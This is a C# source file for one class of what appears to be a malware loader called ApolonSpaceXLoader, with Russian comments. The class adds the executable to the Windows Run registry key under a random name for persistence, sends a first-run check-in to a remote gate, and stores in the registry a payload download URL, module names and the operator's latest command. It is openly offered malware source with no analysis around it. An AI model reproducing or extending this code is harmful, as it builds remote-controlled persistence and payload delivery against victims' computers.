namespace ApolonSpaceXLoader
{
    using Microsoft.Win32;
    using System.Net;
    using System.Windows.Forms;

    class MyRegistry
    {
        private static string name = Helper.RandomID(6);

        //Проверка на реестр
        /// <summary>
        /// Check registry
        /// </summary>
        public static void Check()
        {
            try
            {
                using (RegistryKey ProgramFolder = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\", true))
                {
                    if (ProgramFolder != null)
                    {}
                    else
                    {
                        SetFirstSettings();
                        AR();
                    }
                }
            }
            catch { }
        }

        // автозапуск
        /// <summary>
        /// Auto run
        /// </summary>
        private static void AR()
        {
            using (RegistryKey reg = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\"))
            {
                string ExePath = Application.ExecutablePath;
                reg.SetValue(name, ExePath);
            }
        }

        // устанавливаем значения в реестре
        /// <summary>
        /// Set value in registry
        /// </summary>
        private static void SetFirstSettings()
        {
            using (RegistryKey CreateRegFolder = Registry.CurrentUser.CreateSubKey(@"Software\SpaceX\"))
            {
                CreateRegFolder.SetValue("URL", ""); // тут будет наша ссылка  на скачиваемый файл
                CreateRegFolder?.SetValue("GATE", "NO");
                if (CreateRegFolder.GetValue("GATE").ToString() != "YES") // проверка на отправку на гейт
                {
                    HttpWebRequest.Create(Program.Gate).GetResponse();
                    CreateRegFolder.DeleteValue("GATE");
                    CreateRegFolder.SetValue("GATE", "YES"); // меняем значение
                }
                CreateRegFolder.SetValue("CCom", "not"); // cmd command
            }
            Registry.CurrentUser.CreateSubKey(@"Software\SpaceX\Modules"); // Создаем подраздел для модулей
        }

        // устанавливаем ссылку в реестре
        /// <summary>
        /// Set URL in registry
        /// </summary>
        /// <param name="URL"></param>
        public static void SetURL(string URL)
        {
            using (RegistryKey CreateRegFolder = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\", true))
            {
                CreateRegFolder.DeleteValue("URL");
                CreateRegFolder.SetValue("URL", URL);
            }
        }

        // получаем ссылку из реестра
        /// <summary>
        /// Get link from registry
        /// </summary>
        /// <returns></returns>
        public static string GetURL()
        {
            string url = null;
            using (RegistryKey ProgramFolder = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\"))
            {
                if (ProgramFolder != null)
                {
                    url = ProgramFolder.GetValue("URL").ToString();
                }
            }
            return url;
        }

        // Получаем список модулей
        /// <summary>
        /// Get modules list
        /// </summary>
        /// <returns></returns>
        public static string GetModules()
        {
            try
            {
                string result = string.Empty;
                using (RegistryKey modules = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\Modules"))
                {
                    for (int i = 0; ; i++)
                    {
                        object sr = modules.GetValue(i.ToString());
                        if (sr != null)
                        {
                            result += sr.ToString() + " ";
                        }
                        else
                        {
                            break;
                        }
                    }
                }
                return result;
            }
            catch { return string.Empty; }
        }

        public static bool AddModule(int index, string name)
        {
            try
            {
                using (RegistryKey module = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\Modules", true))
                {
                    module.SetValue(index.ToString(), name);
                }
                return true;
            }
            catch { return false; }
        }

        public static bool UpdateCommand(string com)
        {
            try
            {
                using (RegistryKey CreateRegFolder = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\", true))
                {
                    CreateRegFolder.DeleteValue("CCom");
                    CreateRegFolder.SetValue("CCom", com);
                }
                return true;
            }
            catch { return false; }
        }

        public static string GetLastCommand()
        {
            string result = string.Empty;
            using (RegistryKey CreateRegFolder = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\"))
            {
                result = CreateRegFolder.GetValue("CCom").ToString();
            }
            return result;
        }
    }
}
